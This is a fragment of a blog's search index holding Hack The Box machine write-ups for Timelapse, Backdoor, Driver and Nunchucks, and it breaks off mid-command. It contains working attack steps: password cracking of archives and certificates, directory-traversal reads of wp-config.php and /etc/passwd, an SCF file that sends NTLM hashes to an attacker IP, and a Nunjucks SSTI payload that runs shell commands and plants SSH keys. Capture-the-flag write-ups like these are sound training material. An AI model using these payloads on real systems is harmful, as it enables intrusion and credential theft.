\\HelpDesk\\\u0026gt; ls . D 0 Mon Oct 25 16:48:42 2021 .. D 0 Mon Oct 25 16:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 15:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 15:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 15:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 15:57:44 2021 6367231 blocks of size 4096. 1269439 blocks available smb: \\HelpDesk\\\u0026gt; Foothold winrm_backup.zip is protected with password └─$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: skipping: legacyy_dev_auth.pfx incorrect password Let\u0026rsquo;s crack it zip2john winrm_backup.zip \u0026gt; winrm.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2023-08-24 17:22) 4.545g/s 15769Kp/s 15769Kc/s 15769KC/s surkerior..suppamas Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Unzip └─$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx Okay, we can follow this post If we try it, it\u0026rsquo;s protected with password └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key Enter Import Password: Mac verify error: invalid password? Let\u0026rsquo;s crack this one too pfx2john legacyy_dev_auth.pfx \u0026gt; legacyy_dev_auth.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:58 DONE (2023-08-24 17:28) 0.01705g/s 55112p/s 55112c/s 55112C/s thuglife06..thug211 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s try extracting key again └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: Decrypt it └─$ openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth-decrypted.key Enter pass phrase for legacyy_dev_auth.key: writing RSA key Extract certificate └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt Enter Import Password: Result └─$ ls -lha legacyy_dev_auth* -rw------- 1 kali kali 1.3K Aug 24 17:33 legacyy_dev_auth.crt -rw------- 1 kali kali 1.7K Aug 24 17:33 legacyy_dev_auth-decrypted.key -rw-r--r-- 1 kali kali 5.0K Aug 24 17:27 legacyy_dev_auth.hash -rw------- 1 kali kali 2.1K Aug 24 17:29 legacyy_dev_auth.key -rwxr-xr-x 1 kali kali 2.5K Oct 25 2021 legacyy_dev_auth.pfx Let\u0026rsquo;s connect using evil-winrm evil-winrm -S -k legacyy_dev_auth-decrypted.key -c legacyy_dev_auth.crt -i timelapse.htb User Enumeration Let\u0026rsquo;s check Powershell History We have some creds svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV Let\u0026rsquo;s connect via evil-winrm evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S Root Enumerate svc_deploy is in LAPS_Readers group Let\u0026rsquo;s read LAPS password Get-AdComputer -Identity DC01 -property 'ms-mcs-admpwd' Administrator:e\u0026amp;5O591f8p30N8+C@yIY+3AE Let\u0026rsquo;s connect and get our flag ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/timelapse/images/timelapse.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/","summary":"Timelapse Enumeration nmap └─$ nmap -p- -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 56502/tcp open unknown └─$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.","tags":["HTB","active-directory","crackmapexec","smbclient","laps","zip2john","john","pfx2john","evil-winrm","winrm-keys","powershell-history"],"title":"[HTB] Machine: Timelapse"},{"categories":null,"contents":"Backdoor Enumeration nmap └─$ nmap -p- -Pn 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:07 BST Stats: 0:10:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 58.08% done; ETC: 18:25 (0:07:47 remaining) Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.16s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 1103.92 seconds └─$ nmap -sV -Pn -p22,80,1337 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:44 BST Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 1337/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds Web server gobuster └─$ gobuster dir -u http://10.10.11.125 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.125 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/20 18:50:39 Starting gobuster in directory enumeration mode =============================================================== /wp-content (Status: 301) [Size: 317] [--\u0026gt; http://10.10.11.125/wp-content/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://10.10.11.125/] /wp-login.php (Status: 200) [Size: 5674] /.php (Status: 403) [Size: 277] /license.txt (Status: 200) [Size: 19915] /wp-includes (Status: 301) [Size: 318] [--\u0026gt; http://10.10.11.125/wp-includes/] /wp-trackback.php (Status: 200) [Size: 135] /wp-admin (Status: 301) [Size: 315] [--\u0026gt; http://10.10.11.125/wp-admin/] /xmlrpc.php (Status: 405) [Size: 42] wpscan └─$ wpscan --url http://10.10.11.125 -e _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://10.10.11.125/ [10.10.11.125] [+] Started: Sun Aug 20 18:57:14 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.11.125/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09). | Found By: Rss Generator (Passive Detection) | - http://10.10.11.125/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; | - http://10.10.11.125/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: \u0026#39;Version: 2.8\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:19 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:19 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:41 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:41 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:03 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:03 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Aug 20 18:59:33 2023 [+] Requests Done: 3400 [+] Cached Requests: 39 [+] Data Sent: 940.503 KB [+] Data Received: 556.681 KB [+] Memory used: 285.543 MB [+] Elapsed time: 00:02:18 I was stuck for a moment then I saw post in the forum to check http://10.10.11.125/wp-content/plugins/ Foothold/User We can confirm that ebook plugin is vulnerable https://www.exploit-db.com/exploits/39575 └─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ../../../wp-config.php../../../wp-config.php../../../wp-config.php\u0026lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don\u0026#39;t have to use the web site, you can copy this file to \u0026#34;wp-config.php\u0026#34; * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;MQYBJSaD#DxG6qbm\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); ... Creds didn\u0026rsquo;t work, let\u0026rsquo;s check /etc/passwd └─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd ../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; Let\u0026rsquo;s check the current process └─$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- ../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline/usr/sbin/apache2-kstart\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; We can see the process, let\u0026rsquo;s parse it └─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr \u0026#39;\\000\u0026#39; \u0026#39; \u0026#39; | cut -c115- | rev | cut -c32- | rev /usr/sbin/apache2 -k start We can try checking every process script Had issues with parsing, but did the work #!/bin/bash for i in {500..5000}; do proc=\u0026#34;/proc/$i/cmdline\u0026#34; skip=$((${#proc})) res=$(curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../${proc} | tr \u0026#39;\\000\u0026#39; \u0026#39; \u0026#39; | cut -c $skip- | rev | cut -c 32- | rev) if [[ -n \u0026#34;$res\u0026#34; ]]; then echo \u0026#34;$i: $res\u0026#34; fi done; As a result we have the port we saw in nmap results /bin/sh -c while true;do su user -c \u0026quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026quot;; done 857: ../../..//proc/857/cmdline../../../../../../..//proc/857/cmdline/bin/sh -c while true;do su user -c \u0026#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026#34;; done We can follow Hacktricks\u0026rsquo;s post or use msfconsole Got user Root Enumerate We see screen running as root Let\u0026rsquo;s abuse it https://book.hacktricks.xyz/linux-hardening/privilege-escalation#screen-sessions-hijacking ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/backdoor/images/backdoor.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/backdoor/","summary":"Backdoor Enumeration nmap └─$ nmap -p- -Pn 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:07 BST Stats: 0:10:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 58.08% done; ETC: 18:25 (0:07:47 remaining) Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.16s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 1103.","tags":["HTB","wordpress","wpscan","directory-traversal","ebooks-download","proc","bash","msfvenom","gdb","gdbserver","gdb-remote","screen"],"title":"[HTB] Machine: Backdoor"},{"categories":null,"contents":"Driver Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.106 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 18:16 BST Nmap scan report for 10.10.11.106 (10.10.11.106) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-08-18T00:16:51 |_ start_date: 2023-08-18T00:13:34 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 6h59m24s, deviation: 0s, median: 6h59m23s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds smb enum4linux had no success └─$ smbclient -N -L //10.10.11.106 session setup failed: NT_STATUS_ACCESS_DENIED Port 80 gobuster └─$ gobuster dir -u http://10.10.11.106 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.106 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/17 19:01:38 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 401) [Size: 20] /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/Images/] /Index.php (Status: 401) [Size: 20] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/IMAGES/] /INDEX.php (Status: 401) [Size: 20] Foothold/User From the scren above we saw WWW-Authenticate header https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate A description of the protected area. If no realm is specified, clients often display a formatted hostname instead. We have our username - admin Default admin:admin creds work Firmware update page, which states that it uploads firmware to file share Then it is reviewed by the team So we can utilize .scf file Check https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#shell-command-files Let\u0026rsquo;s create one [Shell] Command=2 IconFile=\\\\10.10.16.4\\anything.exe Launch responder, upload scf and wait And we got hash Let\u0026rsquo;s crack it hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt tony:liltony Test creds with crackmapexec Evil-Winrm Root Since it\u0026rsquo;s a printer box I wondered if PrintNightmare would work Download the POC https://github.com/calebstewart/CVE-2021-1675 ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/driver/images/driver.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/driver/","summary":"Driver Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.106 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 18:16 BST Nmap scan report for 10.10.11.106 (10.10.11.106) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8).","tags":["HTB","net-ntlmv2","scf","responder","hashcat","crackmapexec","evil-winrm","winpeas","printer","printnightmare","cve-2021-1675","invoke-nightmare"],"title":"[HTB] Machine: Driver"},{"categories":null,"contents":"Nunchucks Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.122 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 17:10 BST Nmap scan report for 10.10.11.122 (10.10.11.122) Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-title: Nunchucks - Landing Page | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 |_http-server-header: nginx/1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_ssl-date: TLS randomness does not represent time Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.51 seconds ffuf └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;https://nunchucks.htb/\u0026#39; -H \u0026#39;Host: FUZZ.nunchucks.htb\u0026#39; -fs 30589 -k /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://nunchucks.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 30589 ________________________________________________ [Status: 200, Size: 4029, Words: 1053, Lines: 102, Duration: 387ms] * FUZZ: store Web server gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u https://nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -k --exclude-length 45 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://nunchucks.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 45 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/16 17:22:31 Starting gobuster in directory enumeration mode =============================================================== /privacy (Status: 200) [Size: 19134] /login (Status: 200) [Size: 9172] /terms (Status: 200) [Size: 17753] /signup (Status: 200) [Size: 9488] /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /Privacy (Status: 200) [Size: 19134] /Login (Status: 200) [Size: 9172] /Terms (Status: 200) [Size: 17753] /Assets (Status: 301) [Size: 179] [--\u0026gt; /Assets/] /Signup (Status: 200) [Size: 9488] /SignUp (Status: 200) [Size: 9488] └─$ gobuster dir -u https://store.nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -k --exclude-length 45 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://store.nunchucks.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 45 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/16 17:23:17 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /Assets (Status: 301) [Size: 179] [--\u0026gt; /Assets/] Foothold/User If we submit email in store.nunchucks.htb, we get a response back from the server with our email in the message Possible SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection We can confirm it by entering simple payload {{7*7}} Google express regarding template engine it uses https://expressjs.com/en/resources/template-engines.html Googling shows the Sandbox Breakout - A View of the Nunjucks Template Engine We can test the payload from the post: \u0026quot;{{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\\\u0026quot;)()}}\u0026quot; Now let\u0026rsquo;s get revshell I couldn\u0026rsquo;t get a revshell, so I create authorized_keys file in david\u0026rsquo;s .ssh directory {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('mkdir /home/david/.ssh')\\\u0026quot;)()}} {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('echo ssh-rsa 